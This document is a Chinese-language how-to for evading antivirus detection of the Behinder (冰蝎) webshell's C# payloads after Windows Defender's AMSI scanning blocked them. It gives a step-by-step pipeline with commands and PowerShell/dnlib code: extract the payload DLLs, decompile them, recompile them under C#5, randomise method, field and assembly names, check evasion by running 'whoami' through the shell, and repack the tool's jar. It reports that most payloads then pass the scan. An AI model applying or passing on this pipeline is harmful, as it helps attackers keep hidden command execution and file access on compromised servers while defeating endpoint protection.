# 冰蝎载荷免杀流水线（AMSI 拦截 0x800700E1）

## 背景与判定
- 现象：客户端请求解密成功（无 Padding 错误），但服务端 500，错误页含
  `Operation did not complete successfully because the file contains a virus or potentially unwanted software. (Exception from HRESULT: 0x800700E1)`
- 机制：Windows Defender/宿主杀软经 AMSI 在 `Assembly.Load(byte[])` 时扫描**解密后的程序集字节**，命中已知签名即拒载
- 佐证：自编译的自定义 U.dll（无已知签名）同路径同请求能过 → 是内容签名问题，不是行为拦截

## 无效尝试（2026-08 实测，全部仍被拦）
1. PE 时间戳翻转 + 同长度字符串替换（behinder/rebeyond/execCMD）→ 仍拦（证明非整文件哈希）
2. dnlib 每个方法头插 3-5 个 NOP → 仍拦（方法体 IL 未变，签名仍在）
结论：签名匹配方法体 IL / 元数据结构，微小改动无效。

## 有效流水线（实测通过）
### 1. 提取载荷
`jar 内 net/rebeyond/behinder/payload/csharp/*.dll`（共 13 个：Cmd/BasicInfo/FileOperation/RealCMD/Echo/Eval/Utils/Loader/Plugin/PortMap/ReversePortMap/SocksProxy/Transfer/Database）

### 2. 反编译
- 工具：ICSharpCode.Decompiler **7.2.1.6856**（NuGet netstandard2.0，PS5.1 可加载）
  - NuGet 版本号带 4 段（7.2.1.6856 不是 7.2.1）：`https://www.nuget.org/api/v2/package/ICSharpCode.Decompiler/7.2.1.6856`
  - PS5.1 加载顺序：System.Runtime.CompilerServices.Unsafe 5.0.0 → System.Memory 4.5.5 → System.Collections.Immutable 5.0.0 → System.Reflection.Metadata 5.0.0 → ICSharpCode.Decompiler.dll（全部 lib/netstandard2.0，放同目录 LoadFrom）
- dnSpy.Console 在此环境启动即崩（SetConsoleOutputEncoding IOException，pty 也救不了）→ 用 ICSharpCode.Decompiler 方案
- PS 调用：`New-Object ICSharpCode.Decompiler.CSharp.CSharpDecompiler($path, $settings)` + `DecompileWholeModuleAsString()`

### 3. C#5 兼容转换（Framework csc 只支持 C#5）
- `$"文本{expr}文本"` 插值 → `string.Format("文本{0}文本", expr)`
- C#8 using 声明 `using MemoryStream ms = new MemoryStream();` → `MemoryStream ms = new MemoryStream();`（内存对象可放弃显式 Dispose，功能无损）
- Roslyn csc（Microsoft.Net.Compilers NuGet）此环境 RC=35 崩溃不可用 → 用 Framework csc

### 4. 重编译
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:library /optimize+ \
  /r:System.dll /r:System.Core.dll /r:System.Web.dll /r:System.Xml.dll \
  /r:System.Web.Extensions.dll /r:System.Configuration.dll /r:System.Drawing.dll \
  /out:rebuilt\X.dll X.cs
```
- csc 输出 GBK：Python subprocess 用 capture_output bytes + `.decode("gbk", errors="replace")`，勿 text=True
- Database.dll 引用 MySql.Data/Oracle 类型 → 无引用编译失败，跳过（不影响连接/命令/文件功能）

### 5. dnlib 改名（PowerShell + dnlib 4.5.0 netstandard2.0）
```
$mod = [dnlib.DotNet.ModuleDefMD]::Load($path)
# 改：基础设施字段 Request/Response/Session/Application/page → 随机名
# 改：全部方法名（保留 Equals/.ctor）→ 随机名
# 改：$mod.Assembly.Name / $mod.Name / $mod.Mvid = new Guid
$mod.Write($out)
```
- 保留：类名 U（马 CreateInstance("U")）、客户端要设的字段（Cmd: cmd/path/sessionId）、Equals 覆写
- dnlib 改名后代码引用走 metadata token，功能不受影响；`GetType().GetField(key)` 反射只认保留字段
- 程序集名/模块名/MVID 必改（结构签名的一部分）

### 6. 验证（决定性）
`scripts/behinder_mini_client.py` 全协议实测：
- BasicInfo.dll + {"sessionId":"t"} → 期望 status=success
- Cmd.dll + {"cmd":"whoami"} → 期望 msg 含主机名
- 报 "contains a virus" = 仍被拦，需加大改动（改名没生效/漏了字段）

### 7. 打包回 jar + 备份
- Python zipfile 读原 jar → 替换 payload/csharp/*.dll 条目 → 写新 jar（原子替换）
- 备份：整目录副本 + jar.bak_pre_payload
- 用户需**完全退出**冰蝎（javaw 进程）再重开，否则旧 jar 缓存/退出覆盖

## 经验数据
- 12/13 载荷变异后过杀软；BasicInfo 改名 20 处、Cmd 20 处、Plugin 27 处等（基础设施字段5 + 方法15-25）
- 完整协议验证通过后，冰蝎 GUI 直接可用（连接=BasicInfo 载荷）
